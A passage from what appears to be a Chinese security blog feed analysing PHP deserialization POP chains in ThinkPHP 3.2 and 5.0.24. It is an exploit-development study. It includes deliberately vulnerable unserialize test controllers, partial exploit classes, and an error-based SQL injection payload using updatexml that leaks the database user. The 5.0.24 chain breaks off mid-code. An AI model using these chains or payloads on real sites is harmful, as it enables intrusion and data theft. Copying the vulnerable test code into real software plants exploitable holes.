src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yx&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="代码分析">代码分析</h5><h6 id="寻找漏洞入口imagick">寻找漏洞入口（Imagick）</h6><p>首先要知道反序列化常见起点</p><blockquote><p>__wakeup 一定会调用</p><p>__destruct 一定会调用</p><p>__toString 当一个对象被反序列化后又被当做字符串使用</p></blockquote><p>常见跳板</p><blockquote><p>__toString 当一个对象被当做字符串使用</p><p>__get 读取不可访问或不存在属性时被调用</p><p>__set 当给不可访问或不存在属性赋值时被调用</p><p>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</p><p>形如 <span class="math inline">\(this-&gt;\)</span>func();</p></blockquote><p>常见终点</p><blockquote><p>__call 调用不可访问或不存在的方法时被调用</p><p>call_user_func 一般php代码执行都会选择这里</p><p>call_user_func_array 一般php代码执行都会选择这里</p></blockquote><p>根据以上内容可知，漏洞入口大多在__destruct函数中，全局搜索该函数，原则是寻找可控变量足够多的函数</p><p>根据提示此处选择文件<code>ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</code>，选择该处的原因应该是此处的img变量是可控的</p><p><img src="/post/9bc8e8a9/image-20240320180105453.png" alt="image-20240320180105453" style="zoom: 50%;"></p><h6 id="memcach">Memcach</h6><p>接着寻找可能会有漏洞的destroy函数，还是用全局搜索，这里我选择的是<code>ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</code>文件里的destory函数，因为这里的 <code>this-&gt;handle</code>变量也是可控的</p><p><img src="/post/9bc8e8a9/image-20240320181454587.png" alt="image-20240320181454587" style="zoom: 50%;"></p><p>接下来全局搜索delete函数，这里选择的是<code>ThinkPHP/Library/Think/Model.class.php</code> 文件</p><h6 id="model">Model</h6><p>截至到这里构造的poc如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;img = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Model</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下是添加注释后的delete函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 主键名称</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pk</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">    <span class="comment">// 数据信息</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">// 查询表达式参数</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPk</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;pk;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除记录</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array|int|string $options 删除操作的条件，可以是一个数组、整数或字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int|false 成功删除的记录数，如果操作失败则返回false</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$pk</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getPk</span>(); <span class="comment">// 获取主键字段名</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果$options为空且当前对象的$options[&#x27;where&#x27;]也为空，则删除当前数据对象所对应的记录</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$options</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$pk</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">delete</span>(<span class="variable">$this</span>-&gt;data[<span class="variable">$pk</span>]); <span class="comment">// 递归调用delete方法删除指定主键的记录</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 当前数据对象没有主键值或$options为空，操作失败，返回false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$options</span>) || <span class="title function_ invoke__">is_string</span>(<span class="variable">$options</span>)) &#123;</span><br><span class="line">            <span class="comment">// 根据主键删除记录</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$options</span>, <span class="string">&#x27;,&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$where</span>[<span class="variable">$pk</span>] = <span class="keyword">array</span>(<span class="string">&#x27;IN&#x27;</span>, <span class="variable">$options</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$where</span>[<span class="variable">$pk</span>] = <span class="variable">$options</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$options</span>          = <span class="keyword">array</span>(); <span class="comment">// 清空$options数组</span></span><br><span class="line">            <span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>] = <span class="variable">$where</span>; <span class="comment">// 将主键条件设置为$options[&#x27;where&#x27;]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据复合主键删除记录</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>) &amp;&amp; (<span class="title function_ invoke__">count</span>(<span class="variable">$options</span>) &gt; <span class="number">0</span>) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$pk</span>)) &#123;</span><br><span class="line">            <span class="variable">$count</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="title function_ invoke__">array_keys</span>(<span class="variable">$options</span>) <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_int</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">                    <span class="variable">$count</span>++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$pk</span>) == <span class="variable">$count</span>) &#123;</span><br><span class="line">                <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$pk</span> <span class="keyword">as</span> <span class="variable">$field</span>) &#123;</span><br><span class="line">                    <span class="variable">$where</span>[<span class="variable">$field</span>] = <span class="variable">$options</span>[<span class="variable">$i</span>]; <span class="comment">// 设置复合主键条件</span></span><br><span class="line">                    <span class="keyword">unset</span>(<span class="variable">$options</span>[<span class="variable">$i</span>++]); <span class="comment">// 删除$options数组中对应的主键条件</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>] = <span class="variable">$where</span>; <span class="comment">// 将复合主键条件设置为$options[&#x27;where&#x27;]</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 复合主键条件不匹配，操作失败，返回false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分析表达式</span></span><br><span class="line">        <span class="variable">$options</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_parseOptions</span>(<span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 如果条件为空，则不进行删除操作，除非设置为 1=1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 操作失败，返回false</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$pk</span>])) &#123;</span><br><span class="line">            <span class="variable">$pkValue</span> = <span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$pk</span>]; <span class="comment">// 获取主键值</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_before_delete</span>(<span class="variable">$options</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// _before_delete返回false，操作失败，返回false</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">delete</span>(<span class="variable">$options</span>); <span class="comment">// 调用数据库操作对象的delete方法执行删除操作</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pkValue</span>)) &#123;</span><br><span class="line">                <span class="variable">$data</span>[<span class="variable">$pk</span>] = <span class="variable">$pkValue</span>; <span class="comment">// 将主键值添加到$data数组</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_after_delete</span>(<span class="variable">$data</span>, <span class="variable">$options</span>); <span class="comment">// 调用_after_delete方法执行删除后的操作</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回删除记录个数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>; <span class="comment">// 返回成功删除的记录数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先粗略确认options是可控的，因此猜测558行的delete函数可以成为漏洞点，因为此处的db变量也是可控的</p><p><img src="/post/9bc8e8a9/image-20240320183406820.png" alt="image-20240320183406820" style="zoom:50%;"></p><h6 id="mysqldriver为抽象类">mysql(Driver为抽象类)</h6><p>在文件 <code>ThinkPHP/Library/Think/Db/Driver.class.php</code>中，可以看到是通过拼接的方式生成sql语句，因此只要options构造成功，此处的sql语句就可利用</p><p><img src="/post/9bc8e8a9/image-20240320183656547.png" alt="image-20240320183656547" style="zoom:33%;"></p><p>lz尝试逆向构造，因为这里执行的是delete方法，所以尝试报错注入，后面看到对where进行了拼接，因此想办法让where后面加上<code>'1=updatexml(1,concat(0x7e,database(),0x7e),1)#'</code>实现报错注入，并且这里调用了parseWhere函数，该函数的功能是将查询条件，可以是字符串或数组转变为解析后的WHERE 子句，并在前面加上where，因此就可以判断我们只需要让<code>$options['where']='1=updatexml(1,concat(0x7e,database(),0x7e),1)#'</code></p><p>现在先返回前面Model类的destory函数中，最开始传进来的options变量为空，因此我们需要想办法执行509行的函数实现自行构造参数，因此<code>$this-&gt;data</code> 变量就需要自己构造，将<code>$this-&gt;data[pk]</code>构造成我们想要的内容，那关于Model的poc应该大概如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>\<span class="title class_">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 主键名称</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">        <span class="comment">// 数据信息</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="comment">// 查询表达式参数</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title function_ invoke__">mysql</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data=[</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>=&gt;[</span><br><span class="line">                    <span class="string">&#x27;where&#x27;</span>=&gt;<span class="string">&#x27;1=updatexml(1,concat(0x7e,(select user()),0x7e),1)&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;table&#x27;</span>=&gt;<span class="string">&#x27;users&#x27;</span></span><br><span class="line">                ]</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后成功显示了用户名</p><p><img src="/post/9bc8e8a9/image-20240320191402040.png" alt="image-20240320191402040" style="zoom: 33%;"></p>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;thinkphp3_x反序列化&quot;&gt;Thinkphp3_x(反序列化)&lt;/h4&gt;
&lt;p&gt;参考链接：&lt;a href=&quot;https://www.ctfiot.com/20632.html&quot;&gt;ThinkPHP v3.2.*
（SQL注入&amp;amp;文件读取）反序列化POP链 | CTF导航 (ctfiot.com)&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp5_x（反序列化）</title>
    <link href="http://example.com/post/e1d073c2.html"/>
    <id>http://example.com/post/e1d073c2.html</id>
    <published>2024-03-13T12:03:02.000Z</published>
    <updated>2024-09-28T16:17:20.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="thinkphp5_x反序列化">Thinkphp5_x（反序列化）</h4><span id="more"></span><h5 id="x反序列化">5.0.x反序列化</h5><p>参考链接：<a href="https://www.cnblogs.com/seizer/p/17035791.html">ThinkPHP v5.0.24反序列化 - seizer-zyx - 博客园 (cnblogs.com)</a></p><h6 id="环境">环境</h6><p>PHP5.6+Linux+ThinkPHP5.0.24</p><p>thinkphp5.0.24下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.1.24 tpdemo</span><br></pre></td></tr></table></figure><p>修改composer.json文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.4.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.24&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>同目录下执行<code>composer update</code></p><h6 id="测试代码">测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to thinkphp5.0.24&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="代码分析">代码分析</h6><p>入口：<code>thinkphp/library/think/process/pipes/Windows.php</code>中的<code>__destruct()</code>函数</p><p><img src="/post/e1d073c2/image-20240313191223141.png" alt="image-20240313191223141" style="zoom:50%;"></p><p>此处我们要利用的函数是 <code>removeFiles()</code>，查看该函数</p><p><img src="/post/e1d073c2/image-20240313191615562.png" alt="image-20240313191615562" style="zoom: 50%;"></p><p>此处的 <code>$this-&gt;files</code> 是可控的，也代表<code>$filename</code> 是可控的，而此处的 <code>file_exists()</code>方法是判断 <code>$filename</code> 所指定的文件是否存在，如果<code>$filename</code>是一个类，就会调用该类的<code>__tostring()</code>方法，此处的思路就是找<code>__tostring()</code> 方法有漏洞的类</p><p>此处找的类就是model类，位于<code>thinkphp/library/think/Model.php</code>，但是此处的model是<strong>抽象类</strong>，因此需要找到其子类</p><blockquote><p><strong>抽象类</strong>是一种不能直接实例化的类，它主要用于定义接口和共享代码。在面向对象编程中，抽象类一般用作其他类的基类，其目的是让子类继承它，并且必须实现抽象类中定义的抽象方法。因此，抽象类不能直接被实例化，而是需要子类去继承并实现它的抽象方法后才能被实例化。</p></blockquote><p><img src="/post/e1d073c2/image-20240313192258490.png" alt="image-20240313192258490" style="zoom:50%;"></p><p>找子类的方式就是全局搜索 <code>extends model</code> 的类，此处选择<code>pivot</code> 类，到此为止，我们的exp初步构造如下</p><p><img src="/post/e1d073c2/image-20240313192601144.png" alt="image-20240313192601144" style="zoom:33%;"></p><p>到此为止，我们的exp初步构造如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>=[];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Pivot</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来进入 model.php 文件，在model抽象类中寻找<code>__tostring()</code> 方法，如下所示</p><p><img src="/post/e1d073c2/image-20240313192831145.png" alt="image-20240313192831145" style="zoom:50%;"></p><p>调用了 <code>toJson()</code> 方法</p><p><img src="/post/e1d073c2/image-20240313192904805.png" alt="image-20240313192904805" style="zoom:50%;"></p><p>调用了 <code>toArray()</code> 方法，此处的 <code>toArray()</code>方法是可见的长，重点是那些变量是我们可控的，特别是调用变量的函数的时候，此处选择的漏洞入口就是912行的<code>$value</code> ，选择它的原因是 <code>$value</code>本身是可控的，可以将 <code>$value</code> 构造成一个没有<code>getAttr()</code> 方法且在 <code>__call()</code>方法中存在漏洞的类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>    = [];</span><br><span class="line">        <span class="variable">$visible</span> = [];</span><br><span class="line">        <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 过滤属性</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;visible)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="variable 